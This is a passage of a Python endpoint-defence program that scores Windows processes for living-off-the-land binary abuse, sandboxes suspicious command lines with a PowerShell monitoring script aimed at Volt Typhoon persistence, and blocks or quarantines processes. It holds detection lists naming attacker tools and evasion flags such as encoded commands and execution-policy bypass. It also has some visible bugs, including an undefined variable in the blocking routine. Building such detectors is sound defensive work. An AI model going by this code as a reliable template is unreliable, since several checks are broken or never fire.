            cmdline = process_info.get('cmdline', '').lower()
            if self._detect_lolbin_chaining(cmdline):
                analysis_results['final_risk_score'] = min(
                    analysis_results['final_risk_score'] + 3.0, 
                    10.0
                )
                analysis_results['analyses']['lolbin_chaining'] = True

        except Exception as e:
            self.logger.error(f"Process analysis error: {str(e)}", exc_info=True)
            analysis_results['error'] = str(e)
            analysis_results['final_risk_score'] = 8.0  # Conservative on error

        analysis_results['analysis_time'] = time.time() - analysis_start
        return analysis_results
    
    def _detect_lolbin_chaining(self, command_line):
        """Detect multiple LOLBins being chained together"""
        lolbin_count = 0
        common_lolbins = [
            'powershell.exe', 'cmd.exe', 'certutil.exe', 
            'rundll32.exe', 'bitsadmin.exe', 'mshta.exe'
        ]
        
        for lolbin in common_lolbins:
            if lolbin in command_line:
                lolbin_count += 1
                if lolbin_count >= 2:
                    return True
        return False 
    def _calculate_final_risk(self, analyses):
        """Enhanced risk calculation with LOLBin awareness"""
        weights = {
            'lolbin': 0.4,
            'process_tree': 0.2,
            'ml_prediction': 0.2,
            'behavioral': 0.1,
            'sandbox': 0.1
        }
        
        total_score = 0.0
        total_weight = 0.0
        
        # LOLBin scoring
        lolbin_analysis = analyses.get('lolbin', {})
        if lolbin_analysis and lolbin_analysis.get('detected'):
                severity = analyses['lolbin'].get('severity', 'medium')
                score = {
                    'critical': 10.0,
                    'high': 7.5,
                    'medium': 5.0
                }.get(severity, 5.0)
                total_score += score * weights['lolbin']
                total_weight += weights['lolbin']
            
        # Process tree scoring
        if 'process_tree' in analyses and 'risk_score' in analyses['process_tree']:
            total_score += analyses['process_tree']['risk_score'] * weights['process_tree']
            total_weight += weights['process_tree']
        
        # ML prediction scoring
        if 'ml_prediction' in analyses and 'risk_score' in analyses['ml_prediction']:
            total_score += analyses['ml_prediction']['risk_score'] * weights['ml_prediction']
            total_weight += weights['ml_prediction']
        
        # Behavioral analysis scoring
        if 'behavioral' in analyses:
            threat_level = analyses['behavioral'].get('threat_level', 0)
            behavioral_score = {
                2: 8.0,  # Malicious
                1: 4.0,  # Suspicious
                0: 1.0   # Clean
            }.get(threat_level, 1.0)
            total_score += behavioral_score * weights['behavioral']
            total_weight += weights['behavioral']
        
        # Sandbox scoring
        if ('sandbox' in analyses and 
            not analyses['sandbox'].get('skipped') and 
            'risk_score' in analyses['sandbox']):
            total_score += analyses['sandbox']['risk_score'] * weights['sandbox']
            total_weight += weights['sandbox']
        
        # Calculate weighted average
        final_score = total_score / total_weight if total_weight > 0 else 5.0
        
        # Apply LOLBin chaining penalty if detected
        if analyses.get('lolbin_chaining'):
            final_score = min(final_score + 2.0, 10.0)
        
        return min(final_score, 10.0)
    
    
    async def _sandbox_test(self, process_info):
        """Asynchronous sandbox testing with VM pool"""
        try:
            loop = asyncio.get_running_loop()
            
            # Get available VM from pool
            vm_name = await loop.run_in_executor(
                self.io_thread_pool,
                self.vm_manager.get_available_vm
            )
            
            if not vm_name:
                return {'error': 'No available VM'}
                
            # Prepare command in parallel
            command = await loop.run_in_executor(
                self.cpu_thread_pool,
                self._prepare_sandbox_command,
                process_info
            )
            
            # Execute in sandbox
            execution_result = await loop.run_in_executor(
                self.io_thread_pool,
                self.vm_manager.execute_in_vm,
                vm_name,
                command,
                30
            )
            
            # Analyze results
            sandbox_analysis = await loop.run_in_executor(
                self.cpu_thread_pool,
                self._analyze_sandbox_results,
                execution_result
            )
            
            return sandbox_analysis
        except Exception as e:
            self.logger.error(f"Sandbox testing error: {e}")
            return {'error': str(e), 'risk_assessment': 'HIGH'}
        finally:
            if vm_name:
                await loop.run_in_executor(
                    self.io_thread_pool,
                    self.vm_manager.release_vm,
                    vm_name
                )
                
    def _prepare_sandbox_command(self, process_info):
        """Prepare command for sandbox execution with Volt Typhoon focus"""
        name = process_info['name'].lower()
        cmdline = process_info.get('cmdline', '')
        
        monitoring_script = f"""
        # Volt Typhoon specific monitoring
        $startTime = Get-Date
        
        # Baseline system state
        $baselineServices = Get-Service | Measure-Object
        $baselineTasks = Get-ScheduledTask | Measure-Object
        $baselineProcesses = Get-Process | Measure-Object
        $baselineConnections = Get-NetTCPConnection | Where-Object {{$_.State -eq 'Established'}} | Measure-Object
        
        Write-Output "=== BASELINE ==="
        Write-Output "SERVICES: $($baselineServices.Count)"
        Write-Output "TASKS: $($baselineTasks.Count)"  
        Write-Output "PROCESSES: $($baselineProcesses.Count)"
        Write-Output "CONNECTIONS: $($baselineConnections.Count)"
        
        # Execute the target command
        Write-Output "=== EXECUTING COMMAND ==="
        try {{
            {cmdline}
        }} catch {{
            Write-Output "EXECUTION_ERROR: $($_.Exception.Message)"
        }}
        
        # Post-execution analysis
        Write-Output "=== POST-EXECUTION ANALYSIS ==="
        
        # Check for new scheduled tasks (Volt Typhoon persistence)
        $newTasks = Get-ScheduledTask | Where-Object {{$_.Date -gt $startTime}}
        Write-Output "NEW_TASKS: $($newTasks.Count)"
        if ($newTasks.Count -gt 0) {{
            $newTasks | ForEach-Object {{ Write-Output "TASK: $($_.TaskName) - $($_.TaskPath)" }}
        }}
        
        # Check for service changes (Volt Typhoon persistence)
        $currentServices = Get-Service | Measure-Object
        Write-Output "SERVICE_CHANGES: $(($currentServices.Count - $baselineServices.Count))"
        
        # Check for new network connections (Volt Typhoon C2)
        $currentConnections = Get-NetTCPConnection | Where-Object {{$_.State -eq 'Established'}}
        $newConnections = $currentConnections | Where-Object {{$_.CreationTime -gt $startTime}}
        Write-Output "NEW_CONNECTIONS: $($newConnections.Count)"
        if ($newConnections.Count -gt 0) {{
            $newConnections | ForEach-Object {{ 
                Write-Output "CONNECTION: $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"
            }}
        }}
        
        # Check for registry modifications (Volt Typhoon persistence)
        $runKeys = @(
            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
            'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
        )
        
        Write-Output "=== REGISTRY PERSISTENCE CHECK ==="
        foreach ($key in $runKeys) {{
            try {{
                $entries = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
                if ($entries) {{
                    $entries.PSObject.Properties | Where-Object {{$_.Name -notmatch 'PS'}} | ForEach-Object {{
                        Write-Output "REG_ENTRY: $key\\$($_.Name) = $($_.Value)"
                    }}
                }}
            }} catch {{
                # Key doesn't exist or no access
            }}
        }}
        
        # Check for netsh proxy configuration (Volt Typhoon tunneling)
        Write-Output "=== PROXY CONFIGURATION ==="
        try {{
            $proxyConfig = netsh winhttp show proxy
            Write-Output "PROXY_CONFIG: $proxyConfig"
        }} catch {{
            Write-Output "PROXY_CONFIG: Unable to retrieve"
        }}
        
        Write-Output "=== ANALYSIS COMPLETE ==="
        """
        
        return monitoring_script
    async def _run_sandbox_analysis(self, process_info, lolbin_result, ml_analysis):
        """Conditionally run sandbox analysis based on risk factors"""
        # Skip sandbox for high-severity LOLBins
        if lolbin_result and lolbin_result.get('severity') == 'high':
            return {
                'skipped': True, 
                'reason': 'high_severity_lolbin'
            }
        
        # Get behavioral threat level from ml_analysis
        threat_level = ml_analysis.get('threat_level', 0)
        
        # Run sandbox for medium/high risk processes
        if ml_analysis.get('risk_score', 0) > 5.0 or threat_level >= 2:
            return await self._sandbox_test(process_info)
        
        return {
            'skipped': True, 
            'reason': 'low_initial_risk'
        }
        
    def _analyze_sandbox_results(self, execution_result):
        """Analyze sandbox execution results with Volt Typhoon focus"""
        if not execution_result.get('success', False):
            return {
                'risk_level': 'HIGH',
                'reason': 'Execution failed in sandbox',
                'details': execution_result.get('error', 'Unknown error'),
                'risk_score': 8.0
            }
            
        output = execution_result.get('output', '')
        risk_score = 0.0
        risk_factors = []
        
        # Parse output for indicators
        lines = output.split('\n')
        metrics = {}
        
        for line in lines:
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    key, value = parts
                    metrics[key.strip()] = value.strip()
                
        # Analyze file system changes
        try:
            baseline_size = float(metrics.get('BASELINE_SIZE', 0))
            postexec_size = float(metrics.get('POST_EXEC_SIZE', 0))
            
            if baseline_size > 0:
                change_ratio = abs(postexec_size - baseline_size) / baseline_size
                if change_ratio > 0.5:  # 50% change in file sizes
                    risk_score += 3.0
                    risk_factors.append(f'Significant file system changes: {change_ratio:.2%}')
        except (ValueError, TypeError):
            pass
                
        # Check for mass file creation/deletion
        try:
            baseline_files = int(metrics.get('BASELINE_FILES', 0))
            postexec_files = int(metrics.get('POST_EXEC_FILES', 0))
            
            if baseline_files > 0:
                file_change_ratio = abs(postexec_files - baseline_files) / baseline_files
                if file_change_ratio > 0.3:  # 30% change in file count
                    risk_score += 2.0
                    risk_factors.append(f'File count change: {file_change_ratio:.2%}')
        except (ValueError, TypeError):
            pass
                
        # Check for network activity (Volt Typhoon C2)
        try:
            connections = int(metrics.get('NEW_CONNECTIONS', 0))
            if connections > 0:  # Any new connections are suspicious
                risk_score += 2.0
                risk_factors.append(f'New network connections: {connections}')
        except (ValueError, TypeError):
            pass
            
        # Check for process spawning
        try:
            new_processes = int(metrics.get('NEW_PROCESSES', 0))
            if new_processes > 3:  # More than 3 new processes
                risk_score += 1.5
                risk_factors.append(f'Multiple process creation: {new_processes} processes')
        except (ValueError, TypeError):
            pass
            
        # Check for execution errors
        if 'EXECUTION_ERROR' in output:
            risk_score += 1.0
            risk_factors.append('Command execution errors detected')
            
        # Check for Volt Typhoon specific indicators
        if 'NEW_TASKS' in metrics and int(metrics['NEW_TASKS']) > 0:
            risk_score += 3.0
            risk_factors.append('New scheduled tasks created - possible persistence')
            
        if 'PROXY_CONFIG' in metrics and 'proxy' in metrics['PROXY_CONFIG'].lower():
            risk_score += 2.0
            risk_factors.append('Proxy configuration modified - possible tunneling')
            
        # Determine risk level
        if risk_score >= 6.0:
            risk_level = 'CRITICAL'
        elif risk_score >= 3.0:
            risk_level = 'HIGH'
        elif risk_score >= 1.0:
            risk_level = 'MEDIUM'
        else:
            risk_level = 'LOW'
            
        return {
            'risk_level': risk_level,
            'risk_score': min(risk_score, 10.0),
            'risk_factors': risk_factors,
            'sandbox_metrics': metrics,
            'execution_time': execution_result.get('execution_time', 0)
        }
        
    
        
    async def _make_decision(self, process_info, analysis_result):
        """Make final decision on process execution"""
        risk_score = analysis_result.get('final_risk_score', 5.0)
        pid = process_info['pid']
        process_name = process_info['name']
        cmdline = process_info.get('cmdline', '')

        # Remove PowerShell exception - all processes treated equally
        if risk_score < self.risk_thresholds['allow']:
            decision = 'ALLOW'
            action = self._allow_process
        elif risk_score < self.risk_thresholds['monitor']:
            decision = 'MONITOR'
            action = self._monitor_process
        elif risk_score < self.risk_thresholds['block']:
            decision = 'QUARANTINE'
            action = self._quarantine_process
        else:
            decision = 'BLOCK'
            action = self._block_process

        decision_data = {
            'timestamp': datetime.now().isoformat(),
            'process': process_name,
            'pid': pid,
            'cmdline': cmdline[:500],  # Truncate long command lines
            'risk_score': risk_score,
            'analysis_result': analysis_result,
            'decision': decision
        }

        self.logger.info(f"Decision for {process_name} (PID: {pid}): {decision} (Risk: {risk_score:.2f})")

        # Execute decision
        try:
            await action(process_info, analysis_result)
            decision_data['action_successful'] = True
        except Exception as e:
            self.logger.error(f"Error executing decision {decision}: {e}")
            decision_data['action_successful'] = False
            decision_data['error'] = str(e)

        # Log decision
        self._log_decision(decision_data)
        
    async def _allow_process(self, process_info, analysis_result):
        """Allow process to continue normally"""
        pid = process_info['pid']
        try:
            # Already unfrozen in finally block of _handle_intercepted_process
            self.logger.info(f"Allowed process {pid} to continue")
        except Exception as e:
            self.logger.error(f"Error allowing process {pid}: {e}")
                    
    async def _monitor_process(self, process_info, analysis_result):
        """Monitor process with enhanced logging"""
        pid = process_info['pid']
        self.logger.info(f"Enhanced monitoring for process {process_info['name']} (PID: {pid})")
        asyncio.create_task(self._enhanced_monitoring(pid))       
    async def _quarantine_process(self, process_info, analysis_result):
        """Quarantine process (keep frozen and isolate)"""
        pid = process_info['pid']
        self.logger.warning(f"Quarantining process {process_info['name']} (PID: {pid})")
        self._add_to_blocklist(process_info['name'], process_info.get('cmdline', ''))
            
    async def _block_process(self, process_info, analysis_result):
        """Block/terminate process immediately"""
        pid = process_info['pid']
        name = process_info['name'].lower()
        
        # Critical processes to NEVER kill
        CRITICAL_PROCS = {
            "lsass.exe", "csrss.exe", "wininit.exe", "smss.exe", 
            "services.exe", "system", "svchost.exe"
        }
        
        if name in CRITICAL_PROCS:
            self.logger.critical(f"Blocking aborted for critical process: {name}")
            return
        if analysis_result.get('immediate_block'):
            # Skip forensic collection for critical blocks
            self._terminate_process_tree(pid)
            self._add_to_blocklist(name, cmdline)
            self.logger.critical(f"Immediate block: {name} (PID: {pid})")
            return    
        try:
            
            # Collect forensic data
            forensic_data = await asyncio.get_running_loop().run_in_executor(
                self.cpu_thread_pool,
                self._collect_forensic_data,
                pid,
                analysis_result
            )
            
            # Terminate process tree
            await asyncio.get_running_loop().run_in_executor(
                self.io_thread_pool,
                self._terminate_process_tree,
                pid
            )
            
            # Update blocklist
            self._add_to_blocklist(process_info['name'], process_info.get('cmdline', ''))
            
            # Create snapshot
            asyncio.create_task(self._create_emergency_snapshot())
            
            self.logger.critical(
                f"Blocked malicious process {process_info['name']} (PID: {pid}) - " 
                f"Reason: {analysis_result.get('detected_patterns', 'High risk activity')}"
            )
        except psutil.NoSuchProcess:
            self.logger.info(f"Process {pid} already terminated")
        except Exception as e:
            self.logger.error(f"Blocking failed: {e}")
            
    def _collect_forensic_data(self, pid, analysis_result):
        """Collect forensic evidence before termination"""
        try:
            proc = psutil.Process(pid)
            return {
                'timestamp': datetime.now().isoformat(),
                'process': {
                    'name': proc.name(),
                    'pid': pid,
                    'ppid': proc.ppid(),
                    'cmdline': proc.cmdline(),
                    'create_time': proc.create_time()
                },
                'connections': [{
                    'fd': conn.fd,
                    'family': conn.family,
                    'type': conn.type,
                    'laddr': f"{conn.laddr[0]}:{conn.laddr[1]}" if conn.laddr else None,
                    'raddr': f"{conn.raddr[0]}:{conn.raddr[1]}" if conn.raddr else None,
                    'status': conn.status
                } for conn in proc.net_connections()],
                'open_files': [f.path for f in proc.open_files()],
                'threads': len(proc.threads()),
                'analysis_result': analysis_result
            }
        except Exception:
            return {'error': 'Failed to collect forensic data'}
    def _sync_freeze_process(self, pid):
        """Synchronous process freezing using debug API"""
        if not psutil.pid_exists(pid):
            return True
        if kernel32.DebugActiveProcess(pid):
            self.logger.info(f"Froze process {pid}")
            return True
        else:
            error = ctypes.GetLastError()
            self.logger.error(f"Failed to freeze process {pid}: error {error}")
            return False    
    async def _freeze_process(self, pid):
        """Freeze process using debug API"""
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(
            self.io_thread_pool,
            self._sync_freeze_process,
            pid
        )   
    async def _unfreeze_process(self, pid):
        """Unfreeze process by detaching debugger"""
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(
            self.io_thread_pool,
            self._sync_unfreeze_process,
            pid
        ) 
    def _sync_unfreeze_process(self, pid):
        if not psutil.pid_exists(pid):
            return True
        if kernel32.DebugActiveProcessStop(pid):
            self.logger.info(f"Unfrozen process {pid}")
            return True
        else:
            error = ctypes.GetLastError()
            self.logger.error(f"Failed to unfreeze process {pid}: error {error}")
            return False
            
    def _terminate_process_tree(self, pid):
        """Terminate entire process tree"""
        try:
            parent = psutil.Process(pid)
            for child in parent.children(recursive=True):
                try:
                    child.kill()
                except psutil.NoSuchProcess:
                    pass
            parent.kill()
        except psutil.NoSuchProcess:
            pass
                
    def _add_to_blocklist(self, process_name, cmdline):
        """Add process signature to runtime blocklist"""
        signature = {
            'name': process_name.lower(),
            'cmdline_patterns': self._extract_suspicious_patterns(cmdline),
            'timestamp': time.time()
        }
        self.runtime_blocklist.append(signature)
        self.logger.info(f"Added to blocklist: {signature}")

    def _extract_suspicious_patterns(self, cmdline):
        """Extract unique patterns from command line"""
        patterns = []
        cmd_lower = cmdline.lower() if cmdline else ''
        
        # Check for encoded commands
        if re.search(r'[A-Za-z0-9+/]{30,}={0,2}', cmd_lower):
            patterns.append('base64_encoded')
            
        # Check for suspicious parameters
        suspicious_params = [
            '-encodedcommand', '-windowstyle hidden', 
            '-executionpolicy bypass', '/c', '/s', '/q'
        ]
        patterns.extend(p for p in suspicious_params if p in cmd_lower)
        
        # Check for LOLBins
        lolbins = self.volt_detector.get_extended_lolbins()
        patterns.extend(bin for bin in lolbins if bin in cmd_lower)
        
        return list(set(patterns))  # Deduplicate
            
    async def _enhanced_monitoring(self, pid):
        """Enhanced monitoring for suspicious processes"""
        try:
            proc = psutil.Process(pid)
            for _ in range(60):  # Monitor for 5 minutes (5s intervals)
                if not proc.is_running():
                    break
                await asyncio.sleep(5)
        except psutil.NoSuchProcess:
            pass
        except Exception as e:
            self.logger.error(f"Monitoring error: {e}")

    async def _create_emergency_snapshot(self):
        """Create a system snapshot for potential rollback"""
        try:
            loop = asyncio.get_running_loop()
            await loop.run_in_executor(
                self.io_thread_pool,
                self.vm_manager.create_emergency_snapshot
            )
            self.logger.info("Emergency system snapshot created")
        except Exception as e:
            self.logger.error(f"Snapshot failed: {e}")
    def _log_decision(self, decision_data):
        """Log decision data to CSV"""
        try:
            with open('decision_log.csv', 'a', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([
                    decision_data['timestamp'],
                    decision_data['process'],
                    decision_data['pid'],
                    decision_data['risk_score'],
                    decision_data['decision']
                ])
        except Exception as e:
            self.logger.error(f"Logging failed: {e}")
if __name__ == "__main__":
    asyncio.run(SecurityGateway().start_protection())
    
    